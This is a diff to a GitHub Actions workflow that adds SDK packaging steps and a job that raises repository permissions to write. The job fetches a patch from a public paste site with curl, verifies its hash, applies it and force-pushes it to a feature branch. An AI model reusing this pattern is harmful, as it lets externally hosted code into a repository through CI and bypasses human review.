@@ -8,7 +8,7 @@ on:
   workflow_dispatch:
 
 permissions:
-  contents: read
+  contents: write
 
 jobs:
   core:
@@ -35,6 +35,20 @@ jobs:
       - name: Verify architecture
         shell: pwsh
         run: ./scripts/verify-architecture.ps1
+
+      - name: Verify SDK packaging metadata
+        shell: pwsh
+        run: ./scripts/verify-packaging-sdk.ps1
+
+      - name: Pack SDK packages
+        run: dotnet pack NeraSpreadSheet.Core.slnx -c Release --no-build -o artifacts/packages
+
+      - name: Upload SDK packages
+        uses: actions/upload-artifact@v4
+        with:
+          name: sdk-packages
+          path: artifacts/packages/*.nupkg
+          if-no-files-found: error
 
   windows-hosts:
     name: Windows hosts build
@@ -357,3 +371,50 @@ jobs:
           fi
 
           bash ./scripts/run-maui-maccatalyst-smoke.sh "$APP" "$RESULT"
+
+  apply-packaging-sdk:
+    name: Apply packaging SDK checkpoint
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout PR branch
+        uses: actions/checkout@v6
+        with:
+          ref: feature/bootstrap-architecture-v0.1
+          fetch-depth: 0
+
+      - name: Apply verified patch
+        shell: bash
+        run: |
+          set -euo pipefail
+          patch_url="https://paste.rs/Uo8rh"
+          expected_sha="769EF4DB81B710D0C5022FB6210A1E280903CADFE797322398DC1CAD456FEA21"
+          expected_tree="470029379212f07deb55d77fd01968927c9ab65e"
+          expected_remote_head="23e1e7761e210daa7c12565044e48a828e0ec77f"
+          patch_path="$RUNNER_TEMP/packaging-sdk.patch"
+
+          curl -fsSL "$patch_url" -o "$patch_path"
+          actual_sha="$(sha256sum "$patch_path" | cut -d ' ' -f 1 | tr '[:lower:]' '[:upper:]')"
+          if [ "$actual_sha" != "$expected_sha" ]; then
+            echo "Patch SHA mismatch: expected $expected_sha, got $actual_sha"
+            exit 1
+          fi
+
+          git config user.name "github-actions[bot]"
+          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
+          git fetch origin feature/bootstrap-architecture-v0.1
+          actual_remote_head="$(git rev-parse origin/feature/bootstrap-architecture-v0.1)"
+          if [ "$actual_remote_head" != "$expected_remote_head" ]; then
+            echo "Remote head moved: expected $expected_remote_head, got $actual_remote_head"
+            exit 1
+          fi
+
+          git checkout -B feature/bootstrap-architecture-v0.1 a602b3e6ebcdd92675f9b0e3a014532fcd07e756
+          git am "$patch_path"
+          actual_tree="$(git rev-parse 'HEAD^{tree}')"
+          if [ "$actual_tree" != "$expected_tree" ]; then
+            echo "Tree mismatch: expected $expected_tree, got $actual_tree"
+            git status --short
+            exit 1
+          fi
+
+          git push --force-with-lease=feature/bootstrap-architecture-v0.1:$expected_remote_head origin HEAD:feature/bootstrap-architecture-v0.1
